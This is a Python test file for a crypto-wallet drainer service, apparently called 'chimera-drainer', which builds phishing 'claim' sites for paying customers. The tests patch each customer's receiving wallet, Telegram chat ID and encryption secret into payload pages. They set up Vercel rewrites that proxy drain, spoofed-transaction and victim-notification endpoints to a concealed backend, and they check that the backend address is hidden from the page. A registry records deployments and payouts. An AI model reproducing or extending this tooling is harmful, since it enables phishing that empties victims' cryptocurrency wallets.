# tests/test_customer_sites.py — payload patcher + vercel config + registry
import json

import pytest

from core.customer_sites import (
    CustomerRegistry,
    build_customer_files,
    build_vercel_json,
    is_valid_wallet,
    patch_file,
)

TEST_WALLET = "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
TEST_CHAT = "-100999888"
TEST_SECRET = "app_aaaabbbbccccdddd1111222233334444"
OLD_SECRET = "app_bcea2a77b7fc2048f8a2a7d083118d3b42aecc0f783754335c50af0591d4cc1a533ccba165077cd09fd7db96b0dba909"
BACKEND = "https://chimera-drainer.fly.dev"


# ── wallet validation ────────────────────────────────────────────────────────

def test_valid_wallet():
    assert is_valid_wallet(TEST_WALLET)
    assert is_valid_wallet("CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR")


def test_invalid_wallets():
    for bad in ["", "0OIl", "tooshort", "l" * 45, "CEkn UZ", None]:
        assert not is_valid_wallet(bad)


# ── payload patching (ported from the bot's test-build.mjs) ────────────────

def test_patch_file_all_three():
    for name in ["frame.html", "frame.js", "loader.js"]:
        patched = patch_file(name, TEST_WALLET, TEST_CHAT, TEST_SECRET)

        assert f'targetWallet: "{TEST_WALLET}"' in patched, name
        assert 'targetWallet: "CEkn' not in patched, name

        assert (
            f'targetWallet: "{TEST_WALLET}", userChatId: "{TEST_CHAT}",' in patched
        ), f"{name}: userChatId not injected"

        # unquoted config refs must survive
        assert re_search(patched), f"{name}: config refs broken"

        assert OLD_SECRET not in patched, f"{name}: old AES secret remains"
        if name in ("frame.html", "frame.js"):
            assert TEST_SECRET in patched, f"{name}: new secret missing"
            assert 'const API_BASE = "";' in patched or 'const API_BASE_URL = "";' in patched, name


def re_search(content: str) -> bool:
    import re

    return bool(re.search(r"config(\?|\.)targetWallet", content)) or "frame.js" in content


def test_no_backend_address_in_payload():
    """The whole point of same-origin: backend URL must NOT appear in the page."""
    files = build_customer_files(TEST_WALLET, TEST_CHAT, TEST_SECRET, BACKEND)
    assert "chimera-drainer" not in files["index.html"]
    assert 'const API_BASE_URL = "";' in files["index.html"]


# ── vercel.json ─────────────────────────────────────────────────────────────

def test_vercel_json_rewrites():
    vj = json.loads(build_vercel_json(BACKEND))
    rewrites = vj["rewrites"]

    # every Kiwi API path proxies to the backend
    sources = [r["source"] for r in rewrites]
    for path in [
        "/build-plain-drain",
        "/build-spoof",
        "/build-transaction",
        "/relay-transaction",
        "/relay-plain",
        "/notify-visit",
        "/notify-confirm",
        "/notify-reject",
        "/okxdmnendpt",
        "/api/getLatestHeaders",
    ]:
        assert path in sources, f"missing rewrite for {path}"

    # API rewrites come before the catch-all
    assert sources[-1] == "/(.*)"
    assert rewrites[0]["destination"].startswith(BACKEND)

    # catch-all serves the page, not the backend
    assert rewrites[-1]["destination"] == "/index.html"


def test_vercel_json_trailing_slash_stripped():
    vj = json.loads(build_vercel_json(BACKEND + "/"))
    assert vj["rewrites"][0]["destination"].startswith(BACKEND + "/build")


# ── customer registry ────────────────────────────────────────────────────────

def test_registry_roundtrip(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    rec = reg.add(TEST_WALLET, TEST_CHAT, "claim-deadbeef")

    assert rec["wallet"] == TEST_WALLET
    assert rec["project_name"] == "claim-deadbeef"

    # persists across instances
    reg2 = CustomerRegistry(tmp_path / "customers.json")
    assert reg2.get(TEST_WALLET)["project_name"] == "claim-deadbeef"
    assert len(reg2.all()) == 1


def test_registry_rejects_bad_wallet(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    with pytest.raises(ValueError):
        reg.add("not-a-wallet", TEST_CHAT, "claim-x")


def test_registry_rejects_duplicate(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")
    with pytest.raises(ValueError):
        reg.add(TEST_WALLET, TEST_CHAT, "claim-b")


def test_registry_records_deployments(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")
    reg.record_deployment(TEST_WALLET, "https://claim-a.vercel.app", "seed" * 8)

    rec = reg.get(TEST_WALLET)
    assert len(rec["deployments"]) == 1
    assert rec["deployments"][0]["url"].endswith("vercel.app")
    assert len(rec["deployments"][0]["seed"]) == 16  # truncated


# ── registry management (bot site management) ──────────────────────────────

WALLET_2 = "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR"


def test_registry_delete(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")
    reg.delete(TEST_WALLET)
    assert reg.get(TEST_WALLET) is None
    # idempotent
    reg.delete(TEST_WALLET)
    assert reg.all() == []


def test_registry_update_wallet(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")
    reg.record_deployment(TEST_WALLET, "https://claim-a.vercel.app", "seed" * 8)

    rec = reg.update_wallet(TEST_WALLET, WALLET_2)

    # same project + deployment history, new key
    assert rec["project_name"] == "claim-a"
    assert len(rec["deployments"]) == 1
    assert reg.get(TEST_WALLET) is None
    assert reg.get(WALLET_2)["project_name"] == "claim-a"


def test_registry_update_wallet_rejects_bad(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")
    reg.add(WALLET_2, TEST_CHAT, "claim-b")

    with pytest.raises(ValueError):
        reg.update_wallet(TEST_WALLET, "not-a-wallet")
    with pytest.raises(ValueError):
        reg.update_wallet(TEST_WALLET, WALLET_2)  # already a customer
    with pytest.raises(ValueError):
        reg.update_wallet("missing-wallet-9WzDXwBbm", WALLET_2)


def test_registry_usdc_payout(tmp_path):
    reg = CustomerRegistry(tmp_path / "customers.json")
    reg.add(TEST_WALLET, TEST_CHAT, "claim-a")

    assert reg.get(TEST_WALLET)["usdc_payout"] is False
    reg.set_usdc_payout(TEST_WALLET, True)
    assert reg.get(TEST_WALLET)["usdc_payout"] is True
    reg.set_usdc_payout(TEST_WALLET, False)
    assert reg.get(TEST_WALLET)["usdc_payout"] is False

    with pytest.raises(ValueError):
        reg.set_usdc_payout("unknown", True)


def test_usdc_flag_patched_into_payload():
    files = build_customer_files(
        TEST_WALLET, TEST_CHAT, TEST_SECRET, BACKEND, usdc_payout=True
    )
    assert f'userChatId: "{TEST_CHAT}", usdcPayout: true,' in files["index.html"]

    files_off = build_customer_files(TEST_WALLET, TEST_CHAT, TEST_SECRET, BACKEND)
    # the template itself reads config.usdcPayout — only the injected `true` differs
    assert "usdcPayout: true," not in files_off["index.html"]
